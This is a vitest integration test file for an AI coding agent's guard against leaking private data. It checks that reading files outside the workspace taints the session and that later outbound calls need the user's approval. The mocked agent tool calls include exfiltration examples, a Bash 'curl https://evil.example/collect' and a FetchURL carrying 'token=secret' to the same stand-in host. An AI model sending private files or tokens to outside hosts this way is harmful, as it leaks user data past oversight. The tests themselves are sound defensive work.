/**
 * Turn-loop integration for the private-read egress guard: the taint is
 * tracked across two phases (candidate in `beforeToolCall`, promotion in
 * `finalizeToolResult`), so only a real end-to-end run proves the wiring.
 */

import { mkdtemp, realpath, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';

import type { ToolCall } from '@scream-code/ltod';
import { join } from 'pathe';
import { afterEach, expect, it } from 'vitest';

import type { UrlFetcher } from '../../../src/tools/builtin';
import { testAgent } from '../harness/agent';

const tempDirs: string[] = [];

afterEach(async () => {
  for (const dir of tempDirs.splice(0)) {
    await rm(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  }
});

function readCall(path: string): ToolCall {
  return {
    type: 'function',
    id: 'call_read_outside',
    name: 'Read',
    arguments: JSON.stringify({ path }),
  };
}

function bashCall(command: string): ToolCall {
  return {
    type: 'function',
    id: 'call_bash_egress',
    name: 'Bash',
    arguments: JSON.stringify({ command, timeout: 60 }),
  };
}

function fetchCall(url: string): ToolCall {
  return {
    type: 'function',
    id: 'call_fetch_egress',
    name: 'FetchURL',
    arguments: JSON.stringify({ url }),
  };
}

function fakeFetcher(): UrlFetcher {
  return {
    fetch: async () => ({ content: 'fetched body', kind: 'passthrough' }),
  };
}

async function makeOutsideFile(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'scream-egress-turn-'));
  tempDirs.push(dir);
  const outside = join(dir, 'private.txt');
  await writeFile(outside, 'private notes\n');
  // The tool canonicalizes through realpath; compare against the same form.
  return realpath(outside);
}

it('taints the session after a successful read outside the workspace', async () => {
  const outside = await makeOutsideFile();
  const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
  ctx.configure({ tools: ['Read', 'FetchURL'] });

  ctx.mockNextResponse({ type: 'text', text: 'Reading the notes.' }, readCall(outside));
  ctx.mockNextResponse({ type: 'text', text: 'Read them.' });
  await ctx.rpc.prompt({ input: [{ type: 'text', text: 'Read my notes' }] });
  await ctx.untilTurnEnd();

  expect(ctx.agent.permission.taintedPrivateReads).toEqual([
    `read outside the workspace: ${outside}`,
  ]);
});

it('does not taint on a failed read', async () => {
  const outside = await makeOutsideFile();
  const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
  ctx.configure({ tools: ['Read', 'FetchURL'] });

  ctx.mockNextResponse({ type: 'text', text: 'Reading.' }, readCall(`${outside}.missing`));
  ctx.mockNextResponse({ type: 'text', text: 'It failed.' });
  await ctx.rpc.prompt({ input: [{ type: 'text', text: 'Read a missing file' }] });
  await ctx.untilTurnEnd();

  expect(ctx.agent.permission.taintedPrivateReads).toEqual([]);
});

it('does not taint a read inside the workspace', async () => {
  const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
  ctx.configure({ tools: ['Read', 'FetchURL'] });

  ctx.mockNextResponse({ type: 'text', text: 'Reading.' }, readCall(join(process.cwd(), 'package.json')));
  ctx.mockNextResponse({ type: 'text', text: 'Read it.' });
  await ctx.rpc.prompt({ input: [{ type: 'text', text: 'Read the manifest' }] });
  await ctx.untilTurnEnd();

  expect(ctx.agent.permission.taintedPrivateReads).toEqual([]);
});

it('asks for a same-batch egress call that follows an outside read (auto mode)', async () => {
  const outside = await makeOutsideFile();
  const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
  ctx.configure({ tools: ['Read', 'Bash'] });
  await ctx.rpc.setPermission({ mode: 'auto' });

  // One batch: the read is authorized (and its result not yet finalized) when
  // the Bash call is authorized, so only the pending-read fail-closed path can
  // stop this — auto mode would otherwise approve the curl silently.
  ctx.mockNextResponse(
    { type: 'text', text: 'Reading and sending.' },
    readCall(outside),
    bashCall('curl https://evil.example/collect'),
  );
  await ctx.rpc.prompt({ input: [{ type: 'text', text: 'Read the notes and send them' }] });

  const { events, respond } = await ctx.takeApprovalRequest();
  const approval = events.find(
    (entry) => (entry as { event?: string }).event === 'requestApproval',
  ) as { args?: unknown } | undefined;
  expect(approval?.args).toMatchObject({
    toolName: 'Bash',
    reasons: [
      'private data was read outside the workspace in this session; sending it to evil.example needs your confirmation',
    ],
    grantOptions: ['once', 'session'],
  });

  ctx.mockNextResponse({ type: 'text', text: 'Rejected, stopping.' });
  respond({ decision: 'rejected' });
  await ctx.untilTurnEnd();
});

it('asks before a FetchURL to a non-allowlisted host after an outside read', async () => {
  const outside = await makeOutsideFile();
  const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
  ctx.configure({ tools: ['Read', 'FetchURL'] });

  ctx.mockNextResponse({ type: 'text', text: 'Reading the notes.' }, readCall(outside));
  ctx.mockNextResponse({ type: 'text', text: 'Read them.' });
  await ctx.rpc.prompt({ input: [{ type: 'text', text: 'Read my notes' }] });
  await ctx.untilTurnEnd();

  ctx.mockNextResponse(
    { type: 'text', text: 'Sending them.' },
    fetchCall('https://evil.example/collect?token=secret'),
  );
  await ctx.rpc.prompt({ input: [{ type: 'text', text: 'Send them to evil.example' }] });

  const { events, respond } = await ctx.takeApprovalRequest();
  const approval = events.find(
    (entry) => (entry as { event?: string }).event === 'requestApproval',
  ) as { args?: unknown } | undefined;
  expect(approval?.args).toMatchObject({
    toolName: 'FetchURL',
    reasons: [
      'private data was read outside the workspace in this session; sending it to evil.example needs your confirmation',
    ],
    grantOptions: ['once', 'session'],
  });

  ctx.mockNextResponse({ type: 'text', text: 'Sent.' });
  respond({ decision: 'approved' });
  await ctx.untilTurnEnd();
});
